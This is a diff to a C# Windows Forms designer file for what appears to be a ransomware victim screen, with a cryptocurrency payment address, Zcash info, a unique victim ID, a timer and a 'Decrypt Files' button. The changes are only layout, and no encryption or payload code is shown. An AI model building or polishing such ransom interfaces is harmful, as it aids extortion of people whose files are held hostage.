@@ -51,6 +51,7 @@
             this.lostTimer = new System.Windows.Forms.Timer(this.components);
             this.uniqueKeyDisplay = new System.Windows.Forms.TextBox();
             this.label4 = new System.Windows.Forms.Label();
+            this.textBox1 = new System.Windows.Forms.TextBox();
             ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
             this.groupBox1.SuspendLayout();
             this.groupBox2.SuspendLayout();
@@ -66,14 +67,15 @@
             // 
             // displayMessage
             // 
-            this.displayMessage.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.displayMessage.BackColor = System.Drawing.SystemColors.Control;
+            this.displayMessage.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
             this.displayMessage.Location = new System.Drawing.Point(247, 49);
             this.displayMessage.Multiline = true;
             this.displayMessage.Name = "displayMessage";
             this.displayMessage.ReadOnly = true;
             this.displayMessage.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
             this.displayMessage.Size = new System.Drawing.Size(625, 331);
-            this.displayMessage.TabIndex = 1;
+            this.displayMessage.TabIndex = 16;
             this.displayMessage.Text = resources.GetString("displayMessage.Text");
             // 
             // pictureBox1
@@ -178,6 +180,7 @@
             this.copyBtn.TabIndex = 8;
             this.copyBtn.Text = "Copy";
             this.copyBtn.UseVisualStyleBackColor = true;
+            this.copyBtn.Click += new System.EventHandler(this.copyBtn_Click);
             // 
             // cryptoAddress
             // 
@@ -219,7 +222,7 @@
             this.decryptBtn.Name = "decryptBtn";
             this.decryptBtn.Size = new System.Drawing.Size(194, 37);
             this.decryptBtn.TabIndex = 10;
-            this.decryptBtn.Text = "Decrypt";
+            this.decryptBtn.Text = "Decrypt Files";
             this.decryptBtn.UseVisualStyleBackColor = true;
             this.decryptBtn.Click += new System.EventHandler(this.decryptBtn_Click);
             // 
@@ -291,12 +294,22 @@
             this.label4.TabIndex = 15;
             this.label4.Text = "Unique User ID:";
             // 
+            // textBox1
+            // 
+            this.textBox1.BackColor = System.Drawing.Color.Black;
+            this.textBox1.Location = new System.Drawing.Point(247, 25);
+            this.textBox1.Margin = new System.Windows.Forms.Padding(0);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(0, 20);
+            this.textBox1.TabIndex = 1;
+            // 
             // Display
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.BackColor = System.Drawing.Color.Black;
             this.ClientSize = new System.Drawing.Size(882, 520);
+            this.Controls.Add(this.textBox1);
             this.Controls.Add(this.label4);
             this.Controls.Add(this.uniqueKeyDisplay);
             this.Controls.Add(this.aboutZcash);
@@ -354,5 +367,6 @@
         public System.Windows.Forms.TextBox displayMessage;
         public System.Windows.Forms.TextBox uniqueKeyDisplay;
         private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.TextBox textBox1;
     }
 }
